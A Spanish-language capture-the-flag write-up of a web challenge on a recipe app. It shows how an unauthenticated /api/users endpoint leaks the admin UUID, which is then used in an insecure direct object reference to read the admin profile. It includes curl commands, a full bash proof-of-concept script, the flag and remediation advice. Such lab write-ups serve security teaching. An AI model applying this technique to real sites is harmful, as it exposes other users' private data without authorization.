# 🍳 Mise en Place

> **IDOR** + Information Disclosure en una app de recetas

| Categoría | Dificultad | Puntos | Autor |
|---|---|---|---|
| Web | 🟢 Easy | 190 | diriartev |

**Flag:** `flag{49257b87adf0da34}`

---

## Resumen (TL;DR)

La aplicación expone información sensible en `/api/users`: cualquier usuario no autenticado puede listar los UUIDs de todos los usuarios registrados, incluido el administrador.

Al registrar una cuenta de prueba se observa que los perfiles se acceden por `/profile/<uuid>`. Reemplazando nuestro UUID por el del administrador se accede a su perfil (**IDOR**, *Insecure Direct Object Reference*), que contiene la flag.

**Causa raíz:** falta de control de acceso al solicitar recursos por su identificador directo, sumada a la fuga de información en la API pública.

| | |
|---|---|
| **Instancia** | `99a768bf000a196d.chal.ctf.ae` (HTTPS) |

## Paso 0 — Preparación

Se intercepta el tráfico con **Burp Suite** como proxy y se navega la aplicación de forma normal para poblar el historial HTTP.

```bash
B="https://99a768bf000a196d.chal.ctf.ae"
```

## Paso 1 — Reconocimiento y fuga de información

En el historial de Burp se observan referencias (en HTML/JS) a rutas del backend: `/api/users` y `/api/recipes`. Se investiga el endpoint de usuarios:

```bash
curl -s "$B/api/users" | jq
```

La respuesta revela el UUID del administrador:

```json
[
  {
    "username": "admin",
    "uuid": "7599f5fa-e155-45a3-a2b8-1d5bf065e530",
    "role": "admin"
  }
]
```

## Paso 2 — Entender la lógica de negocio

Se registra una cuenta de prueba. Al visitar el propio perfil, la URL tiene esta forma:

```text
https://99a768bf000a196d.chal.ctf.ae/profile/9a9a4d31-7325-4759-8da0-6c85848cfcb6
```

La aplicación usa el UUID del usuario directamente en la URL para renderizar el perfil.

## Paso 3 — Explotación (IDOR)

Hipótesis: el servidor no valida si el usuario actual tiene permiso para ver ese perfil y confía ciegamente en el UUID de la URL. Se reemplaza nuestro UUID por el del administrador:

```bash
curl -s "$B/profile/7599f5fa-e155-45a3-a2b8-1d5bf065e530" | grep -i "flag{"
```

El servidor no hace ninguna validación de autorización y devuelve el HTML del perfil del administrador con la flag.

🚩 **FLAG:** `flag{49257b87adf0da34}`

## PoC completo

```bash
#!/usr/bin/env bash
# Mise en Place IDOR PoC — autor: diriartev
B="https://99a768bf000a196d.chal.ctf.ae"

# 1) Obtener el UUID del administrador desde la API expuesta
ADMIN_UUID=$(curl -s "$B/api/users" | grep -oP '"uuid":\s*"\K[^"]+' | head -n 1)
echo "[+] UUID del admin: $ADMIN_UUID"

# 2) Explotar el IDOR accediendo directamente al perfil
echo "[+] Extrayendo la flag del perfil del administrador..."
curl -s "$B/profile/$ADMIN_UUID" | grep -oP 'flag\{[^}]+\}'
```

## Remediación

- **Sanitización de APIs:** `/api/users` no debería ser público. Si es necesario para alguna funcionalidad, no debe exponer roles privilegiados ni UUIDs de otros usuarios.
- **Control de acceso:** al procesar `GET /profile/<uuid>`, el servidor debe verificar que la sesión actual (cookie o token) corresponde a ese `<uuid>`. Si no, debe responder `403 Forbidden`.

## Conclusión

Los UUIDs son difíciles de adivinar y protegen contra la enumeración, pero **la impredecibilidad de un identificador no sustituye un control de acceso real**. Si un atacante obtiene el UUID de otro usuario (information disclosure) y el endpoint confía en el parámetro sin validar la sesión (IDOR), la seguridad por oscuridad se desmorona. Siempre revisa qué datos sensibles filtran tus APIs.
